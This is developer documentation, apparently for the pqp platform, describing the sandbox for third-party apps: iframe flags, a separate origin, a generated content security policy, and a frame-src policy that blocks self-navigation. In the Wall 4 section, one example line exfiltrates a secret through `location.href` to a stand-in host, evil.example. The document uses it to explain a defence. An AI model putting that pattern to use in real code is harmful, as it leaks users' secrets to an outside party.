# The sandbox

An app runs code nobody at pqp wrote, inside a page people trust with their account. The sandbox is how that is safe. It is built from four independent walls, so a hole in one is not a hole in the product.

## Wall 1: an iframe with no privileges

The page creates the frame like this:

```html
<iframe sandbox="allow-scripts" allow="" referrerpolicy="no-referrer" src="https://<apps origin>/<id>/<version>/index.html">
```

- `sandbox="allow-scripts"` and nothing else. In particular **no `allow-same-origin`**. Without it the frame gets an *opaque origin*: it is not `https://pqp-apps...`, it is the string `null`. It cannot use cookies, `localStorage`, `sessionStorage` or IndexedDB (each throws a `SecurityError`), and it cannot script the page that contains it.
- No `allow-forms`, so a `<form>` never fires `submit` (Chromium blocks it before your code sees it). Use plain inputs and a button. A test for Enquete, the live poll, keeps `<form>` out of its HTML for this reason.
- No `allow-popups`, `allow-top-navigation`, `allow-modals`, `allow-downloads`. No `alert()`, no `window.open`, no downloads.
- `allow=""`: no camera, microphone, geolocation, clipboard, fullscreen, or any other browser feature. Fullscreen is a request you make through `app.ui.fullscreen()`, and the page does it.
- `referrerpolicy="no-referrer"`: the frame leaks nothing about where it was opened from.

## Wall 2: a separate site

The bundle is served from the **apps origin**, a different site from `pqp.gg` (hosted: a separate Cloudflare Pages project), which sets no cookies and has no login. A bundle never shares a registrable domain with pqp, so even if the sandbox flags were somehow lost, the browser's own same-origin rules still keep the app away from the page. The server builds bundle addresses itself from the stored manifest (`<origin>/<id>/<version>/<path>`), never from anything a client sends.

## Wall 3: a content security policy the packager writes

Every bundle is served with this policy, generated for it, in the `_headers` file `pnpm apps:build` writes:

```text
default-src 'none';
script-src 'self';
style-src 'self';
img-src 'self' data: blob:;
font-src 'self';
media-src blob:;
connect-src 'none';
base-uri 'none';
form-action 'none';
frame-ancestors https://pqp.gg https://www.pqp.gg ...
```

What that means for you:

- **Your scripts and styles must be files in the bundle.** No inline `<script>`, no inline `<style>`, no `style="..."` attributes, no `onclick=`. The build fails on every one of them, naming the file.
- **No network.** `connect-src 'none'`: no `fetch`, no `XMLHttpRequest`, no `WebSocket`, no `EventSource`, no `sendBeacon`. Anything you need must come with the bundle, as an [asset](/concepts/storage), or from the people in the session over the [bridge](/concepts/bridge).
- **No outside images, fonts, scripts, frames.** Images may be your own files, `data:` or `blob:` URLs. There is no `unsafe-eval`, so no `eval` and no `new Function`.
- **It can only be framed by pqp** (`frame-ancestors`), so nobody can embed your bundle on another page and probe it.

The manifest's `sandbox` block is the only thing that widens the policy, one narrow switch at a time, and each is reviewed:

| Knob | Adds | For |
|---|---|---|
| `wasm: true` | `'wasm-unsafe-eval'` in `script-src` | WebAssembly (an emulator core) |
| `localBlobs: true` | `connect-src blob:` (still no network) | reading a file the person picked, turned into a blob |
| `blobWorkers: true` | `worker-src blob:` | an app that starts its own workers |

There is no free-text policy and no knob for the network.

## Wall 4: the page's own policy, against self-navigation

A policy inside the frame cannot stop the frame from navigating *itself*: `location.href = "https://evil.example/?" + secret`, a `<meta http-equiv=refresh>` or a clicked anchor are navigations, and CSP has no `navigate-to`. The only control is on the **embedding** page. So when the first app frame mounts, the pqp page adds a `frame-src` policy that names the apps origin and the few sites pqp already embeds (YouTube, Twitch, TikTok, Instagram, Cloudflare Turnstile). A frame that tries to navigate anywhere else is refused by the browser. pqp's browser tests run this in Chromium, WebKit and Firefox against a canary server: without the policy a query string reaches the canary in all three; with it, none does.

The page also removes the frame if it loads a second document (it left the one it was given), and if it sends no `hello` within 20 seconds.

The [Security page](/security) lists what is still residual.

## What this costs you, and how to work with it

| You want | Do this |
|---|---|
| Persist something between sessions | You cannot. See [What an app can keep](/concepts/storage). |
| Fetch data from an API | You cannot. Ship it in the bundle or as an [asset](/sdk/app#assets). |
| Play a sound | `media-src` allows `blob:` only, so a sound is an [asset](/sdk/app#assets) whose bytes you turn into a Blob URL. None of the first-party apps plays sound yet, so treat this route as untested. |
| Open a link | You cannot. There is no navigation. Show the text and let the person act. |
| Use `window.prompt` / `alert` | You cannot (`allow-modals` is off). Draw your own dialog. |
| Be keyboard accessible | You must. The frame is one tab stop and the page never traps focus or captures Escape. An app that traps focus fails review. |

Next: [the bridge](/concepts/bridge), the one channel you do have.
